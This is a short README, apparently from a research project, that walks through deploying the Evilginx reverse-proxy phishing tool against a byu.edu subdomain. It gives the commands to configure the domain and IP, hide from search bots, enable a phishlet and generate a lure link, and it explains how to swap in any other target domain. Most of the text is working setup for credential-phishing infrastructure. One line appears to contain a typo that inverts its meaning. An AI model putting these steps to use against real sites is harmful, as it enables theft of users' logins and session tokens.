#Evilginx

The Evilginx binary was simply run manually within a tmux window to prevent it from exiting upon terminating it's parent SSH session. 

Make sure your configuration file is placed in ./phishlets/configName.yaml, relative to the Evilginx binary itself. The example "fingerprint.yml" configuration can be used by replacing all instances of "fingerprint" or "byu.edu" with your target subdomain and domain respectively, and by replacing "evilginx" with your proxy subdomain. The "path" configuration line determines where the user lands when navigating to the proxy domain. 

Ensure the Evilginx binary is executable:
```
chmod +x evilginx
```

Run the binary to begin configuring it further:
```
sudo evilginx
```

Set up the domain and IP address, then blacklist search bots:
```
config domain <domain>

config ip <IP>

blacklist unauth
```

Set the fingerprint phishlet to use your domain name, then turn it on:  
```
phishlets hostname fingerprint fingerprint.byu.edu

phishlets enable fingerprint
```

This will automatically request an SSL certificate from Let's Encrypt as long as you've done the DNS step properly. 

Now create a lure, or a link that will be used to access the proxy site:  
```
lures create fingerprint

lures edit 0 redirect_url https://fingerprint.byu.edu/wp-admin

lures get-url 0
```

This will return a URL that can not be used to send requests through the proxy!

Evilginx v3.3.0 was used for our data collection. 